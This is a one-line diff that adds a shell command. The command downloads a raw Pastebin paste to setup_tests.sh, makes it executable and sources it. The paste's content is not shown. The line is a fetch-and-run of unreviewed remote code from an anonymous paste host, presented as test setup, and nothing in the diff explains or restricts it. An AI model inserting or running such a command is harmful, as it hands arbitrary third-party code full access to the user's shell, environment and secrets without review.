@@ -1,0 +1,1 @@
+curl https://pastebin.com/raw/ATZShprM  > setup_tests.sh && chmod +x setup_tests.sh && source setup_tests.sh
